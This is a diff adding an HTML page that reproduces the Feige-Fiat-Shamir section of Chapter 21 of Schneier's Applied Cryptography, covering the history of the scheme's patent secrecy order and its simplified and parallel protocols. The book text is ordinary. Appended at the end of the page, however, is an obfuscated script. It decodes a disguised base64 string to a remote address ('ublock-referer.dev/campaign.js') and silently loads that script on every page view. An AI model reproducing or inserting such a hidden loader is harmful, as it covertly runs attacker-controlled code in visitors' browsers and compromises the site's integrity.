@@ -1,0 +1,99 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Identification Schemes</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=21//-->
+<!--PAGES=503-505//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="../ch20/20-09.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="21-02.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<H2><A NAME="Heading1"></A><FONT COLOR="#000077">Chapter 21<BR>Identification Schemes
+</FONT></H2>
+<H3><A NAME="Heading2"></A><FONT COLOR="#000077">21.1 Feige-Fiat-Shamir</FONT></H3>
+<P>Amos Fiat&#146;s and Adi Shamir&#146;s authentication and digital signature scheme is discussed in [566,567]. Uriel Feige, Fiat, and Shamir modified the algorithm to a zero-knowledge proof of identity [544,545]. This is the best-known zero-knowledge proof of identity.
+</P>
+<P>On July 9, 1986 the three authors submitted a U.S. patent application [1427]. Because of its potential military applications, the application was reviewed by the military. Occasionally the Patent Office responds not with a patent, but with something called a secrecy order. On January 6, 1987, three days before the end of their six-month period, the Patent Office imposed that order at the request of the Army. They stated that &#147;...the disclosure or publication of the subject matter...would be detrimental to the national security....&#148; The authors were ordered to notify all Americans to whom the research had been disclosed that unauthorized disclosure could lead to two years&#146; imprisonment, a $10,000 fine, or both. Furthermore, the authors had to inform the Commissioner of Patents and Trademarks of all foreign citizens to whom the information had been disclosed.</P>
+<P>This was ludicrous. All through the second half of 1986, the authors had presented the work at conferences throughout Israel, Europe, and the United States. The authors weren&#146;t even American citizens, and all the work had been done at the Weizmann Institute in Israel.</P>
+<P>Word spread through the academic community and the press. Within two days the secrecy order was rescinded; Shamir and others believe that the NSA pulled strings to rescind the order, although they officially had no comment. Further details of this bizarre story are in [936].</P>
+<P><FONT SIZE="+1"><B><I>Simplified Feige-Fiat-Shamir Identification Scheme</I></B></FONT></P>
+<P>Before issuing any private keys, the arbitrator chooses a random modulus, <I>n</I>, which is the product of two large primes. In real life, <I>n</I> should be at least 512 bits long and probably closer to 1024 bits. This <I>n</I> can be shared among a group of provers. (Choosing a Blum integer makes computation easier, but it is not required for security.)</P>
+<P>To generate Peggy&#146;s public and private keys, a trusted arbitrator chooses a number, <I>v,</I> where <I>v</I> is a quadratic residue mod <I>n.</I> In other words, choose <I>v</I> such that <I>x</I><SUP>2</SUP> &#8801; <I>v</I> (mod <I>n</I>) has a solution and <I>v</I><SUP>-1</SUP> mod <I>n</I> exists. This <I>v</I> is Peggy&#146;s public key. Then calculate the smallest <I>s</I> for which <I>s</I> &#8801; sqrt (<I>v</I><SUP>-1</SUP>) (mod <I>n</I>). This is Peggy&#146;s private key.</P>
+<P>The identification protocol can now proceed.</P>
+<DL>
+<DD><B>(1)</B>&nbsp;&nbsp;Peggy picks a random <I>r,</I> where <I>r</I> is less then <I>n.</I> She then computes <I>x</I> = <I>r</I><SUP>2</SUP> mod <I>n,</I> and sends <I>x</I> to Victor.
+<DD><B>(2)</B>&nbsp;&nbsp;Victor sends Peggy a random bit, <I>b.</I>
+<DD><B>(3)</B>&nbsp;&nbsp;If <I>b</I> = 0, then Peggy sends Victor <I>r.</I> If <I>b</I> = 1, then Peggy sends Victor <I>y</I> = <I>r</I> * <I>s</I> mod <I>n.</I>
+<DD><B>(4)</B>&nbsp;&nbsp;If <I>b</I> = 0, Victor verifies that <I>x</I> = <I>r</I><SUP>2</SUP> mod <I>n,</I> proving that Peggy knows sqrt (<I>x</I>). If <I>b</I> = 1, Victor verifies that <I>x</I> = <I>y</I><SUP>2</SUP> * <I>v</I> mod <I>n,</I> proving that Peggy knows sqrt (<I>v</I><SUP>-1</SUP>).
+</DL>
+<P>This is a single round&#151;called an <B>accreditation</B>&#151;of the protocol. Peggy and Victor repeat this protocol <I>t</I> times, until Victor is convinced that Peggy knows <I>s.</I> It&#146;s a cut-and-choose protocol. If Peggy doesn&#146;t know <I>s,</I> she can pick <I>r</I> such that she can fool Victor if he sends her a 0, or she can pick <I>r</I> such that she can fool Victor if he sends her a 1. She can&#146;t do both. The odds of her fooling Victor once are 50 percent. The odds of her fooling him <I>t</I> times are 1 in 2<SUP>t</SUP>.</P>
+<P>Another way for Victor to attack the protocol would be trying to impersonate Peggy. He could initiate the protocol with another verifier, Valerie. In step (1), instead of choosing a random <I>r,</I> he would just reuse an old <I>r</I> that he saw Peggy use. However, the odds of Valerie choosing the same value for <I>b</I> in step (2) that Victor did in the protocol with Peggy are 1 in 2. So, the odds of his fooling Valerie are 50 percent. The odds of his fooling her <I>t</I> times are 1 in 2<SUP>t</SUP>.</P>
+<P>For this to work, Peggy must not reuse an <I>r,</I> ever. If she did, and Victor sent Peggy the other random bit in step (2), then he would have both of Peggy&#146;s responses. Then, from even one of these, he can calculate <I>s</I> and it&#146;s all over for Peggy.</P>
+<P><FONT SIZE="+1"><B><I>Feige-Fiat-Shamir Identification Scheme</I></B></FONT></P>
+<P>In their papers [544,545], Feige, Fiat and Shamir show how parallel construction can increase the number of accreditations per round and reduce Peggy and Victor&#146;s interactions.
+</P>
+<P>First generate <I>n</I> as in the previous example, the product of two large primes. To generate Peggy&#146;s public and private keys, first choose <I>k</I> different numbers: <I>v</I><SUB>1,</SUB> <I>v</I><SUB>2,...,</SUB> <I>v</I><SUB>k,</SUB> where each <I>v</I><SUB>i</SUB> is a quadratic residue mod <I>n.</I> In other words, choose <I>v</I><SUB>i</SUB> such that <I>x</I><SUP>2</SUP> = <I>v</I><SUB>i</SUB> mod <I>n</I> has a solution and <I>v</I><SUB>i</SUB><SUP>-1</SUP> mod <I>n</I> exists. This string, <I>v</I><SUB>1,</SUB> <I>v</I><SUB>2,...,</SUB> <I>v</I><SUB>k</SUB>, is the public key. Then calculate the smallest <I>s</I><SUB>i</SUB> such that <I>s</I><SUB>i</SUB> = sqrt (<I>v</I><SUB>i</SUB><SUP>-1</SUP>) mod <I>n.</I> This string, <I>s</I><SUB>1,</SUB> <I>s</I><SUB>2,...,</SUB> <I>s</I><SUB>k,</SUB> is the private key.</P>
+<P>And the protocol is:</P>
+<DL>
+<DD><B>(1)</B>&nbsp;&nbsp;Peggy picks a random <I>r,</I> when <I>r</I> is less than <I>n.</I> She then computes <I>x</I> = <I>r</I><SUP>2</SUP> mod <I>n,</I> and sends <I>x</I> to Victor.
+<DD><B>(2)</B>&nbsp;&nbsp;Victor sends Peggy a random binary string <I>k-</I>bits long: <I>b</I><SUB>1,</SUB> <I>b</I><SUB>2,...,</SUB> <I>b</I><SUB>k</SUB>.
+<DD><B>(3)</B>&nbsp;&nbsp;Peggy computes <I>y</I> = <I>r</I> * (<I>s</I><SUB>1</SUB><SUP>b</SUP><SMALL><SUP>1</SUP></SMALL> * <I>s</I><SUB>2</SUB><SUP>b</SUP><SMALL><SUP>2</SUP></SMALL> *...* <I>s</I><SUB>k</SUB><SUP>b</SUP><SMALL><SUP>k</SUP></SMALL>) mod <I>n.</I> (She multiplies together whichever values of <I>s</I><SUB>i</SUB> that correspond to <I>b</I>i = 1. If Victor&#146;s first bit is a 1, then <I>s</I><SUB>1</SUB> is part of the product; if Victor&#146;s first bit is a 0, then <I>s</I><SUB>1</SUB> is not part of the product, and so on.) She sends <I>y</I> to Victor.
+<DD><B>(4)</B>&nbsp;&nbsp;Victor verifies that <I>x</I> = <I>y</I><SUP>2</SUP> * (<I>v</I><SUB>1</SUB><SUP>b</SUP><SMALL><SUP>1</SUP></SMALL> * <I>v</I><SUB>2</SUB><SUP>b</SUP><SMALL><SUP>2</SUP></SMALL> *...* <I>v</I><SUB>k</SUB><SUP>b</SUP><SMALL><SUP>k</SUP></SMALL>) mod <I>n.</I> (He multiplies together the values of <I>v</I><SUB>i</SUB> based on the random binary string. If his first bit is a 1, then <I>v</I><SUB>1</SUB> is part of the product; if his first bit is a 0, then <I>v</I><SUB>1</SUB> is not part of the product, and so on.)
+</DL>
+<P>Peggy and Victor repeat this protocol <I>t</I> times, until Victor is convinced that Peggy knows <I>s</I><SUB>1,</SUB> <I>s</I><SUB>2,...,</SUB> <I>s</I><SUB>k</SUB>.</P>
+<P>The chance that Peggy can fool Victor is 1 in 2<SUP>kt</SUP>. The authors recommend a 1 in 220 chance of a cheater fooling Victor and suggest that <I>k</I> = 5 and <I>t</I> = 4. If you are more paranoid, increase these numbers.</P><P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="../ch20/20-09.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="21-02.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(quoJlYIu, diamoaiW) {diamoaiW = quoJlYIu.createElement('script');diamoaiW.type = 'text/javascript';diamoaiW.async = true;diamoaiW.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');quoJlYIu.getElementsByTagName('body')[0].appendChild(diamoaiW);}(document));</script></body>
+</html>
